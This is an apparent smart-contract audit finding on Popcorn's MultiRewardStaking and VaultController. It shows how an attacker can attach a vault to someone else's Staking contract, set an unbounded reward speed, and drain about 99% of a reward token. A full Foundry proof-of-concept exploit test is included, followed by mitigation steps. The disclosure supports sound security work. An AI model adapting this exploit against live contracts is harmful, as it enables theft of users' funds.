[H-09] Attacker can steal 99% of total balance from any reward token in any Staking contract
Submitted bygjaldon
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L483-L503
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L296-L315
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L377-L378
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L390-L399
Impact
Attacker can steal 99% of the balance of a reward token of any Staking contract in the blockchain. An attacker can do this by modifying the reward speed of the target reward token.
So an attacker gets access tochangeRewardSpeed, he will need to deploy a vault using the target Staking contract as its Staking contract. Since the Staking contract is now attached to the attacker’s created vault, he can now successfullychangeRewardSpeed. Now withchangeRewardSpeed, attacker can set therewardSpeedto any absurdly large amount that allows them to drain 99% of the balance (dust usually remains due to rounding issues) after some seconds (12 seconds in the PoC.)
Proof of Concept
This attack is made possible by the following issues:
Any user can deploy a Vault that uses any existing Staking contract -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108As long as attacker is creator of a Vault that has the target Staking contract attached to it, attacker can callchangeStakingRewardSpeedsto modify the rewardSpeeds of any reward tokens in the target Staking contract -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L495-L501There are no checks for limits on therewardsPerSecondvalue inchangeRewardSpeedso attacker can set any amount they want -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314changeRewardSpeedalso uses_calcRewardsEndto get the newrewardsEndTimestampbut that calculation is faulty and the new timestamp is always longer than it’s supposed to be leading to people being able to claim more rewards than they should get -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360
Below is the PoC using a Foundry test:
functiontest__steal_rewards_from_any_staking_contract()public{addTemplate("Adapter",templateId,adapterImpl,true,true);addTemplate("Strategy","MockStrategy",strategyImpl,false,true);addTemplate("Vault","V1",vaultImpl,true,true);// 1. deploy regular legit vault owned by thisaddressvault=deployVault();addressstaking=vaultRegistry.getVault(vault).staking;rewardToken.mint(staking,1_000_000ether);vm.startPrank(bob);asset.mint(bob,10000ether);asset.approve(vault,10000ether);IVault(vault).deposit(10000ether,bob);IVault(vault).approve(staking,10000ether);IMultiRewardStaking(staking).deposit(9900ether,bob);vm.stopPrank();vm.startPrank(alice);// 2. deploy attacker-owned vault using the same Staking contract as legit vault// alice is the attackeraddressattackerVault=controller.deployVault(VaultInitParams({asset:iAsset,adapter:IERC4626(address(0)),fees:VaultFees({deposit:100,withdrawal:200,management:300,performance:400}),feeRecipient:feeRecipient,owner:address(this)}),DeploymentArgs({id:templateId,data:abi.encode(uint256(100)) }),DeploymentArgs({id:0,data:""}),staking,"",VaultMetadata({vault:address(0),staking:staking,creator:alice,metadataCID:metadataCid,swapTokenAddresses:swapTokenAddresses,swapAddress:address(0x5555),exchange:uint256(1)}),0);asset.mint(alice,10ether);asset.approve(vault,10ether);IVault(vault).deposit(10ether,alice);IVault(vault).approve(staking,10ether);IMultiRewardStaking(staking).deposit(1ether,alice);address[]memorytargets=newaddress[](1);targets[0] =attackerVault;IERC20[]memoryrewardTokens=newIERC20[](1);rewardTokens[0] =iRewardToken;uint160[]memoryrewardsSpeeds=newuint160[](1);rewardsSpeeds[0] =990_099_990ether;controller.changeStakingRewardsSpeeds(targets,rewardTokens,rewardsSpeeds);assertGt(rewardToken.balanceOf(staking),1_000_000ether);vm.warp(block.timestamp+12);MultiRewardStaking(staking).claimRewards(alice,rewardTokens);assertGt(rewardToken.balanceOf(alice),999_999ether);assertLt(1ether,rewardToken.balanceOf(staking));vm.stopPrank();}
The PoC shows that the attacker, Alice, can drain any reward token of a Staking contract deployed by a different vault owner. In this test case, Alice does the attack described above stealing a total 999,999 worth of reward tokens (99% of reward tokens owned by the Staking contract.)
Note that the attacker can tweak the amount they stake in the contract, the reward speed they’ll use, and the seconds to wait before, before claiming rewards. All of those things have an effect on the cost of the attack and how much can be drained.
The test can be run with:forge test --no-match-contract 'Abstract' --match-test test__steal_rewards_from_any_staking_contract
Tools Used
VS Code, Foundry
Recommended Mitigation Steps
Don’t allow any Vault creator to use and modify just ANY Staking contract -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108Add checks to limit how highrewardsPerSecondcan be when changing rewardSpeed. Maybe make it so that it takes a minimum of 1 month (or some other configurable period) for rewards to be distributed. -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314Fix calcRewardsEnd to compute the correct rewardsEndTimestamp by taking into account total accrued rewards until that point in time -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360
RedVeil (Popcorn) confirmed